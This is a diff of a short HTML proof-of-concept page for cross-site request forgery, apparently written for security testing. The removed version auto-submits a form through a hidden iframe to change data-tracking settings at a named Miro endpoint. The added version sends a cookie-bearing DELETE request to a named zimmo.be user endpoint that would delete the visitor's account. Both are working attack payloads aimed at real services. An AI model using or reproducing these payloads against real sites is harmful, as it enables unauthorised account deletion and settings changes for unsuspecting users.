@@ -1,17 +1,23 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h2>CSRF PoC - multipart/form-data</h2>
-    <form action="https://svc.eu01.miro.com/api/ai-gateway/data-tracking-settings/update/3458764633775730812" 
-          method="POST" 
-          enctype="multipart/form-data" 
-          target="hiddenFrame">
-      
-      <input type="text" name="dataTrackingEnabled" value="true">
-      <input type="submit" value="Submit CSRF Request">
-    </form>
+    <h1>CSRF PoC - JavaScript DELETE Attempt</h1>
+    <button onclick="sendCSRF()">Click to trigger DELETE</button>
 
-    <!-- Hide request response -->
-    <iframe name="hiddenFrame" style="display:none;"></iframe>
+    <script>
+      function sendCSRF() {
+        fetch("https://user-api.zimmo.be/users/me", {
+          method: "DELETE",
+          credentials: "include", // Send cookies
+        })
+        .then(response => response.text())
+        .then(data => {
+          console.log("Response:", data);
+        })
+        .catch(error => {
+          console.error("Error:", error);
+        });
+      }
+    </script>
   </body>
 </html>
